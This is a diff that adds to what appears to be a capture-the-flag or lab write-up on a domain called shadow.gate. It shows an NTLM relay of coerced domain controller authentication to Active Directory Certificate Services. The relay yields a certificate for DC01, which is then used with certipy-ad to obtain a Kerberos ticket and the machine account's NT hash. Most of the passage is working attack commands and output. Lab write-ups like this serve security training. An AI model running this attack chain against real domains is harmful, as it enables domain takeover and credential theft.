@@ -332,5 +332,36 @@ COERCE_PLUS 10.1.130.196    445    DC01             Exploit Success, efsrpc\EfsR
 This has relayed authentication back to me!
 
 ```python
-
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 10.1.130.196, attacking target http://shadow.gate
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.1.130.196 against http://shadow.gate SUCCEED [1]
+[*] http:///@shadow.gate [1] -> Generating CSR...
+[*] http:///@shadow.gate [1] -> CSR generated!
+[*] http:///@shadow.gate [1] -> Getting certificate...
+[*] (SMB): Received connection from 10.1.130.196, attacking target http://shadow.gate
+[*] http:///@shadow.gate [1] -> GOT CERTIFICATE! ID 3
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.1.130.196 against http://shadow.gate SUCCEED [2]
+[*] http:///@shadow.gate [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
+[*] http:///@shadow.gate [1] -> Certificate successfully written to file
+[*] http:///@shadow.gate [2] -> Skipping user  since attack was already performed
 ```
+I now have a certificate for DC01
+
+```python
+certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.130.196        
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC01.shadow.gate'
+[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
+[*] Using principal: 'dc01$@shadow.gate'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc01.ccache'
+[*] Wrote credential cache to 'dc01.ccache'
+[*] Trying to retrieve NT hash for 'dc01$'
+[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:57867e655d1abc9f45fd6e954e351531
+```
+Now i have the NTLM hash for the userm, 
